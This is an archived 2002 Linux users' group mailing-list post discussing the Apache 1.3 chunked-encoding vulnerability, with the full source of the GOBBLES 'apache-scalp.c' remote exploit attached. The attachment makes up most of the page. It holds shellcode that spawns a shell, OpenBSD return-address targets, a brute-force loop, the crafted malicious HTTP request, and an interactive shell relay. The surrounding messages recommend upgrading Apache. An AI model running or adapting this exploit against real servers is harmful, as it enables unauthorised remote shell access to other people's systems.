<!-- MHonArc v2.5.2 -->
<!--X-Subject: Re: [tlug] Apache config help -->
<!--X-From-R13: Xbfu Uybire <wztybiNvapbtra.pbz> -->
<!--X-Date: Fri, 21 Jun 2002 04:38:11 +0900 (JST) -->
<!--X-Message-Id: 3D122F5A.8060704@example.com -->
<!--X-Content-Type: multipart/mixed -->
<!--X-Reference: 200206200831.g5K8VQh15956@example.com -->
<!--X-Reference: Pine.GSO.4.44.0206201844040.10822&#45;100000@example.com -->
<!--X-Reference: 20020620195018.61ce2dc7.gstewart@example.com&#45;centre.com -->
<!--X-Head-End-->
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<html>
<head>
  <title>TLUG Mailing List</title>
  <meta http-equiv="Content-type" content="text/html">
  <meta name="Author" content="Jim Tittsler - listmaster TLUG">
  <meta http-equiv="keywords" content="Tokyo Linux Users Group mailing list archive.">
</head>
 
<body bgcolor="#FFFFFF" text="#000000" BACKGROUND="../back3grnd.gif">
<BLOCKQUOTE>
<CENTER><IMG SRC="../tlug_logo.gif"><BR>Mailing List Archive</CENTER>
<P>
<TABLE BGCOLOR="#FFFF66" BORDER=1 COLS=1 WIDTH="90%" CLASS=navbar>
<TR>
<TD>&nbsp;&nbsp;
<FONT FACE="Verdana, Lucida Sans, Arial, Helvetica, Geneva, sans-serif"><SMALL>
<A HREF="../../index.html" TITLE="Tokyo Linux Users Group Page">
<STRONG>tlug.jp</STRONG></A> 
<IMG SRC="../../images/arrow_yellow.gif" WIDTH=13 HEIGHT=9 ALIGN=bottom ALT="-&gt;">
<A HREF="../../list.html" TITLE="Mailing List Page">Mailing List</A> 
<IMG SRC="../../images/arrow_yellow.gif" WIDTH=13 HEIGHT=9 ALIGN=bottom ALT="-&gt;">
<A HREF="../index.html" TITLE="tlug Archive Page">tlug archive</A> 
<IMG SRC="../../images/arrow_yellow.gif" WIDTH=13 HEIGHT=9 ALIGN=bottom ALT="-&gt;">
tlug Mailing List Archive
</SMALL></FONT>
</TD></TR>
</TABLE>
<P>
<!--X-Body-Begin-->
<!--X-User-Header-->
<!--X-User-Header-End-->
<!--X-TopPNI-->
<hr>
[<a href="msg00419.html">Date Prev</a>][<a href="msg00421.html">Date Next</a>][<a href="msg00419.html">Thread Prev</a>][<a href="msg00421.html">Thread Next</a>][<a href="maillist.html#00420">Date Index</a>][<a href="threads.html#00420">Thread Index</a>]
<!--X-TopPNI-End-->
<!--X-MsgBody-->
<!--X-Subject-Header-Begin-->
<h1>Re: [tlug] Apache config help</h1>
<hr>
<!--X-Subject-Header-End-->
<!--X-Head-of-Message-->
<ul>
<li>Date: Thu, 20 Jun 2002 15:39:06 -0400</li>
<li><strong>From</strong>: <strong>Josh Glover &lt;<A HREF="mailto:jmglov@DOMAIN.HIDDEN?SUBJECT=Re%3A%20%5Btlug%5D%20Apache%20config%20help">jmglov@example.com</A>&gt;</strong></li>
<li><strong>Subject</strong>: <strong>Re: [tlug] Apache config help</strong></li>
<li>References: &lt;<a href="msg00415.html">200206200831.g5K8VQh15956@example.com</a>&gt;	&lt;<a href="msg00418.html">Pine.GSO.4.44.0206201844040.10822-100000@example.com</a>&gt; &lt;<a href="msg00419.html">20020620195018.61ce2dc7.gstewart@example.com</a>&gt;</li>
<li>Organization: INCOGEN, Inc.</li>
<li>User-agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.0) Gecko/20020606</li>
</ul>
<!--X-Head-of-Message-End-->
<!--X-Head-Body-Sep-Begin-->
<hr>
<!--X-Head-Body-Sep-End-->
<!--X-Body-of-Message-->
<pre>
Godwin Stewart wrote:
&gt; On Thu, 20 Jun 2002 18:45:46 +0100 (BST), Tim Hurman &lt;kano-tlug@example.com&gt;
&gt; wrote to tlug@example.com:
&gt; 
&gt; 
&gt;&gt;While on the subject of Apache, I am probably stating the obvious, but
&gt;&gt;does everyone know that versions up to 1.3.24 have a DoSable bug, which
&gt;&gt;someone has now reased an exploit for?
&gt; 
&gt; 
&gt; Found out about that yesterday (thanks to another Linux list) and upgraded
&gt; to 1.3.26 straight away :)
&gt; 

Just to clarify, the shellcode in the 'sploit (you are referring to the 
GOBBLES one, I assume--the only ready-to-run one that I have seen in the 
wild so far) is aimed at OpenBSD. However, building some Linux shellcode 
should be trivial. Fortunately, 5cr1p7 X1dd135 are not known for their 
technical skillz, so we Linux types might be lucky enough to escape 
serious danger for a couple more days than the poor OpenBSD admins.

Also, the vulnerability is far more serious than a DoS--the 'sploit that 
I have seen[1] gives you a remote shell.

--Josh

[1] What the hell, apache-scalp.c is attached to this message. Read it, 
it is a very interesting vulnerability, and the exploit is quite well coded.


-- 
Josh Glover &lt;jmglov@example.com&gt;

Associate Systems Administrator
INCOGEN, Inc.
</pre>
<pre>
/*
 * apache-scalp.c
 * OPENBSD/X86 APACHE REMOTE EXPLOIT!!!!!!! 
 * 
 * ROBUST, RELIABLE, USER-FRIENDLY MOTHERFUCKING 0DAY WAREZ!
 *
 * BLING! BLING! --- BRUTE FORCE CAPABILITIES --- BLING! BLING!
 * 
 * &quot;. . . and Doug Sniff said it was a hole in Epic.&quot;
 *
 * ---
 * Disarm you with a smile
 * And leave you like they left me here
 * To wither in denial
 * The bitterness of one who's left alone
 * ---
 *
 * Remote OpenBSD/Apache exploit for the &quot;chunking&quot; vulnerability. Kudos to
 * the OpenBSD developers (Theo, DugSong, jnathan, *@#!w00w00, ...) and
 * their crappy memcpy implementation that makes this 32-bit impossibility
 * very easy to accomplish. This vulnerability was recently rediscovered by a slew
 * of researchers.
 *
 * The &quot;experts&quot; have already concurred that this bug...
 *      -       Can not be exploited on 32-bit *nix variants
 *      -       Is only exploitable on win32 platforms
 *      -       Is only exploitable on certain 64-bit systems
 *
 * However, contrary to what ISS would have you believe, we have
 * successfully exploited this hole on the following operating systems:
 *
 *      Sun Solaris 6-8 (sparc/x86)
 *      FreeBSD 4.3-4.5 (x86)
 *      OpenBSD 2.6-3.1 (x86)
 *      Linux (GNU) 2.4 (x86)
 *
 * Don't get discouraged too quickly in your own research. It took us close
 * to two months to be able to exploit each of the above operating systems.
 * There is a peculiarity to be found for each operating system that makes the
 * exploitation possible.
 *
 * Don't email us asking for technical help or begging for warez. We are
 * busy working on many other wonderful things, including other remotely
 * exploitable holes in Apache. Perhaps The Great Pr0ix would like to inform
 * the community that those holes don't exist? We wonder who's paying her.
 *
 * This code is an early version from when we first began researching the
 * vulnerability. It should spawn a shell on any unpatched OpenBSD system
 * running the Apache webserver.
 *
 * We appreciate The Blue Boar's effort to allow us to post to his mailing
 * list once again. Because he finally allowed us to post, we now have this
 * very humble offering.
 *
 * This is a very serious vulnerability. After disclosing this exploit, we
 * hope to have gained immense fame and glory.
 *
 * Testbeds: synnergy.net, monkey.org, 9mm.com
 *
 * Abusing the right syscalls, any exploit against OpenBSD == root. Kernel
 * bugs are great. 
 *
 * [#!GOBBLES QUOTES]
 * 
 * --- you just know 28923034839303 admins out there running
 *     OpenBSD/Apache are going &quot;ugh..not exploitable..ill do it after the
 *     weekend&quot;
 * --- &quot;Five years without a remote hole in the default install&quot;. default
 *      package = kernel. if theo knew that talkd was exploitable, he'd cry.
 * --- so funny how apache.org claims it's impossible to exploit this.
 * --- how many times were we told, &quot;ANTISEC IS NOT FOR YOU&quot; ?       
 * --- I hope Theo doesn't kill himself                        
 * --- heh, this is a middle finger to all those open source, anti-&quot;m$&quot;
 *     idiots... slashdot hippies...
 * --- they rushed to release this exploit so they could update their ISS
 *     scanner to have a module for this vulnerability, but it doesnt even
 *     work... it's just looking for win32 apache versions
 * --- no one took us seriously when we mentioned this last year. we warned
 *     them that moderation == no pie.
 * --- now try it against synnergy :&gt;                           
 * --- ANOTHER BUG BITE THE DUST... VROOOOM VRRRRRRROOOOOOOOOM
 *
 * xxxx  this thing is a major exploit. do you really wanna publish it?
 * oooo  i'm not afraid of whitehats
 * xxxx  the blackhats will kill you for posting that exploit
 * oooo  blackhats are a myth
 * oooo  so i'm not worried
 * oooo  i've never seen one
 * oooo  i guess it's sort of like having god in your life
 * oooo  i don't believe there's a god
 * oooo  but if i sat down and met him
 * oooo  i wouldn't walk away thinking
 * oooo  &quot;that was one hell of a special effect&quot;
 * oooo  so i suppose there very well could be a blackhat somewhere
 * oooo  but i doubt it... i've seen whitehat-blackhats with their ethics
 *       and deep philosophy...
 *
 * [GOBBLES POSERS/WANNABES]
 *
 * --- #!GOBBLES@example.com (none of us join here, but we've sniffed it)
 * --- super@example.com (low-level.net)
 *
 * GOBBLES Security
 * GOBBLES@example.com
 * <A  HREF="http://www.bugtraq.org">http://www.bugtraq.org</A>
 *
 */


#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;netdb.h&gt;
#include &lt;sys/time.h&gt;
#include &lt;signal.h&gt;


#define EXPLOIT_TIMEOUT		5	/* num seconds to wait before assuming it failed */
#define RET_ADDR_INC		512


#define MEMCPY_s1_OWADDR_DELTA	-146
#define PADSIZE_1		4
#define PADSIZE_2 		5
#define PADSIZE_3		7


#define REP_POPULATOR		24
#define REP_RET_ADDR		6
#define REP_ZERO		36
#define REP_SHELLCODE		24
#define NOPCOUNT		1024

#define NOP			0x41
#define PADDING_1		'A'
#define PADDING_2		'B'
#define PADDING_3		'C'

#define PUT_STRING(s)		memcpy(p, s, strlen(s)); p += strlen(s);
#define PUT_BYTES(n, b)		memset(p, b, n); p += n;

#define SHELLCODE_LOCALPORT_OFF 30

char shellcode[] =
  &quot;\x89\xe2\x83\xec\x10\x6a\x10\x54\x52\x6a\x00\x6a\x00\xb8\x1f&quot;
  &quot;\x00\x00\x00\xcd\x80\x80\x7a\x01\x02\x75\x0b\x66\x81\x7a\x02&quot;
  &quot;\x42\x41\x75\x03\xeb\x0f\x90\xff\x44\x24\x04\x81\x7c\x24\x04&quot;
  &quot;\x00\x01\x00\x00\x75\xda\xc7\x44\x24\x08\x00\x00\x00\x00\xb8&quot;
  &quot;\x5a\x00\x00\x00\xcd\x80\xff\x44\x24\x08\x83\x7c\x24\x08\x03&quot;
  &quot;\x75\xee\x68\x0b\x6f\x6b\x0b\x81\x34\x24\x01\x00\x00\x01\x89&quot;
  &quot;\xe2\x6a\x04\x52\x6a\x01\x6a\x00\xb8\x04\x00\x00\x00\xcd\x80&quot;
  &quot;\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe2\x31\xc0\x50&quot;
  &quot;\x52\x89\xe1\x50\x51\x52\x50\xb8\x3b\x00\x00\x00\xcd\x80\xcc&quot;;


struct {
	char *type;
	u_long retaddr;
} targets[] = {	// hehe, yes theo, that say OpenBSD here!
	{ &quot;OpenBSD 3.0 x86 / Apache 1.3.20&quot;,	0xcf92f },
	{ &quot;OpenBSD 3.0 x86 / Apache 1.3.22&quot;,	0x8f0aa },
	{ &quot;OpenBSD 3.0 x86 / Apache 1.3.24&quot;,	0x90600 },
	{ &quot;OpenBSD 3.1 x86 / Apache 1.3.20&quot;,	0x8f2a6 },
	{ &quot;OpenBSD 3.1 x86 / Apache 1.3.23&quot;,	0x90600 },
	{ &quot;OpenBSD 3.1 x86 / Apache 1.3.24&quot;,	0x9011a },
	{ &quot;OpenBSD 3.1 x86 / Apache 1.3.24 #2&quot;,	0x932ae },
};


int main(int argc, char *argv[]) {

	char           *hostp, *portp;
	unsigned char   buf[512], *expbuf, *p;
	int             i, j, lport;
	int             sock;
	int             bruteforce, owned, progress;
	u_long          retaddr;
	struct sockaddr_in sin, from;


	if(argc != 3) {
		printf(&quot;Usage: %s &lt;target#|base address&gt; &lt;ip[:port]&gt;\n&quot;, argv[0]);
		printf(&quot;  Using targets:\t./apache-scalp 3 127.0.0.1:8080\n&quot;);
		printf(&quot;  Using bruteforce:\t./apache-scalp 0x8f000 127.0.0.1:8080\n&quot;);
		printf(&quot;\n--- --- - Potential targets list - --- ----\n&quot;);
		printf(&quot;Target ID / Target specification\n&quot;);
		for(i = 0; i &lt; sizeof(targets)/8; i++)
			printf(&quot;\t%d / %s\n&quot;, i, targets[i].type);

		return -1;
	}


	hostp = strtok(argv[2], &quot;:&quot;);
	if((portp = strtok(NULL, &quot;:&quot;)) == NULL)
		portp = &quot;80&quot;;

	retaddr = strtoul(argv[1], NULL, 16);
	if(retaddr &lt; sizeof(targets)/8) {
		retaddr = targets[retaddr].retaddr;
		bruteforce = 0;
	}
	else
		bruteforce = 1;
		

	srand(getpid());
	signal(SIGPIPE, SIG_IGN);
	for(owned = 0, progress = 0;;retaddr += RET_ADDR_INC) {

		/* skip invalid return adresses */
		i = retaddr &amp; 0xff;
		if(i == 0x0a || i == 0x0d)
			retaddr++;
		else if(memchr(&amp;retaddr, 0x0a, 4) || memchr(&amp;retaddr, 0x0d, 4))
			continue;


		sock = socket(AF_INET, SOCK_STREAM, 0);
		sin.sin_family = AF_INET;
		sin.sin_addr.s_addr = inet_addr(hostp);
		sin.sin_port = htons(atoi(portp));
		if(!progress)
			printf(&quot;\n[*] Connecting.. &quot;);

		fflush(stdout);
		if(connect(sock, (struct sockaddr *) &amp; sin, sizeof(sin)) != 0) {
			perror(&quot;connect()&quot;);
			exit(1);
		}

		if(!progress)
			printf(&quot;connected!\n&quot;);


		/* Setup the local port in our shellcode */
		i = sizeof(from);
		if(getsockname(sock, (struct sockaddr *) &amp; from, &amp;i) != 0) {
			perror(&quot;getsockname()&quot;);
			exit(1);
		}

		lport = ntohs(from.sin_port);
		shellcode[SHELLCODE_LOCALPORT_OFF + 1] = lport &amp; 0xff;
		shellcode[SHELLCODE_LOCALPORT_OFF + 0] = (lport &gt;&gt; 8) &amp; 0xff;


		p = expbuf = malloc(8192 + ((PADSIZE_3 + NOPCOUNT + 1024) * REP_SHELLCODE)
				    + ((PADSIZE_1 + (REP_RET_ADDR * 4) + REP_ZERO + 1024) * REP_POPULATOR));

		PUT_STRING(&quot;GET / HTTP/1.1\r\nHost: apache-scalp.c\r\n&quot;);

		for (i = 0; i &lt; REP_SHELLCODE; i++) {
			PUT_STRING(&quot;X-&quot;);
			PUT_BYTES(PADSIZE_3, PADDING_3);
			PUT_STRING(&quot;: &quot;);
			PUT_BYTES(NOPCOUNT, NOP);
			memcpy(p, shellcode, sizeof(shellcode) - 1);
			p += sizeof(shellcode) - 1;
			PUT_STRING(&quot;\r\n&quot;);
		}

		for (i = 0; i &lt; REP_POPULATOR; i++) {
			PUT_STRING(&quot;X-&quot;);
			PUT_BYTES(PADSIZE_1, PADDING_1);
			PUT_STRING(&quot;: &quot;);
			for (j = 0; j &lt; REP_RET_ADDR; j++) {
				*p++ = retaddr &amp; 0xff;
				*p++ = (retaddr &gt;&gt; 8) &amp; 0xff;
				*p++ = (retaddr &gt;&gt; 16) &amp; 0xff;
				*p++ = (retaddr &gt;&gt; 24) &amp; 0xff;
			}

			PUT_BYTES(REP_ZERO, 0);
			PUT_STRING(&quot;\r\n&quot;);
		}

		PUT_STRING(&quot;Transfer-Encoding: chunked\r\n&quot;);
		snprintf(buf, sizeof(buf) - 1, &quot;\r\n%x\r\n&quot;, PADSIZE_2);
		PUT_STRING(buf);
		PUT_BYTES(PADSIZE_2, PADDING_2);
		snprintf(buf, sizeof(buf) - 1, &quot;\r\n%x\r\n&quot;, MEMCPY_s1_OWADDR_DELTA);
		PUT_STRING(buf);

		write(sock, expbuf, p - expbuf);

		progress++;
		if((progress%70) == 0)
			progress = 1;

		if(progress == 1) {
			memset(buf, 0, sizeof(buf));
			sprintf(buf, &quot;\r[*] Currently using retaddr 0x%lx, length %u, localport %u&quot;,
				retaddr, (unsigned int)(p - expbuf), lport);
			memset(buf + strlen(buf), ' ', 74 - strlen(buf));
			puts(buf);
			if(bruteforce)
				putchar(';');
		}
		else
			putchar((rand()%2)? 'P': 'p');


		fflush(stdout);
		while (1) {
			fd_set          fds;
			int             n;
			struct timeval  tv;

			tv.tv_sec = EXPLOIT_TIMEOUT;
			tv.tv_usec = 0;

			FD_ZERO(&amp;fds);
			FD_SET(0, &amp;fds);
			FD_SET(sock, &amp;fds);

			memset(buf, 0, sizeof(buf));
			if(select(sock + 1, &amp;fds, NULL, NULL, &amp;tv) &gt; 0) {
				if(FD_ISSET(sock, &amp;fds)) {
					if((n = read(sock, buf, sizeof(buf) - 1)) &lt;= 0)
						break;

					if(!owned &amp;&amp; n &gt;= 4 &amp;&amp; memcmp(buf, &quot;\nok\n&quot;, 4) == 0) {
						printf(&quot;\nGOBBLE GOBBLE!@#%%)*#\n&quot;);
						printf(&quot;retaddr 0x%lx did the trick!\n&quot;, retaddr);
						sprintf(expbuf, &quot;uname -a;id;echo hehe, now use 0day OpenBSD local kernel exploit to gain instant r00t\n&quot;);
						write(sock, expbuf, strlen(expbuf));
						owned++;
					}

					write(1, buf, n);
				}

				if(FD_ISSET(0, &amp;fds)) {
					if((n = read(0, buf, sizeof(buf) - 1)) &lt; 0)
						exit(1);

					write(sock, buf, n);
				}
			}

			if(!owned)
				break;
		}

		free(expbuf);
		close(sock);

		if(owned)
			return 0;

		if(!bruteforce) {
			fprintf(stderr, &quot;Ooops.. hehehe!\n&quot;);
			return -1;
		}
	}

	return 0;
}
</pre>

<!--X-Body-of-Message-End-->
<!--X-MsgBody-End-->
<!--X-Follow-Ups-->
<hr>
<!--X-Follow-Ups-End-->
<!--X-References-->
<ul><li><strong>References</strong>:
<ul>
<li><strong><a name="00415" href="msg00415.html">Re: [tlug] Apache config help</a></strong>
<ul><li><em>From:</em> Jim Breen</li></ul></li>
<li><strong><a name="00418" href="msg00418.html">Re: [tlug] Apache config help</a></strong>
<ul><li><em>From:</em> Tim Hurman</li></ul></li>
<li><strong><a name="00419" href="msg00419.html">Re: [tlug] Apache config help</a></strong>
<ul><li><em>From:</em> Godwin Stewart</li></ul></li>
</ul></li></ul>
<!--X-References-End-->
<!--X-BotPNI-->
<ul>
<li>Prev by Date:
<strong><a href="msg00419.html">Re: [tlug] Apache config help</a></strong>
</li>
<li>Next by Date:
<strong><a href="msg00421.html">Re: [tlug] Apache config help</a></strong>
</li>
<li>Previous by thread:
<strong><a href="msg00419.html">Re: [tlug] Apache config help</a></strong>
</li>
<li>Next by thread:
<strong><a href="msg00421.html">Re: [tlug] Apache config help</a></strong>
</li>
<li>Index(es):
<ul>
<li><a href="maillist.html#00420"><strong>Date</strong></a></li>
<li><a href="threads.html#00420"><strong>Thread</strong></a></li>
</ul>
</li>
</ul>

<!--X-BotPNI-End-->
<!--X-User-Footer-->
<strong>
<a href="../index.html">Home</a> |
<a href="maillist.html">Main Index</a> |
<a href="threads.html">Thread Index</a>
</strong>
<!--X-User-Footer-End-->
 
<P>
<CENTER>
 <table border=2 width=75%><tr><td align=center>
<a href="../../index.html"> Home Page</a></td>
<td align=center><a href="../../list.html"> Mailing List </a></td>
<td align=center><a href="../../linuxinjapan.html"> Linux and Japan </a></td>
<td align=center><a href="../../members.html">TLUG Members</a></td>
<td align=center><a href="../../linuxlinks.html">Links</a></td>
</tr></TABLE>
<P>
</CENTER>
</BLOCKQUOTE>
</body>
</html>
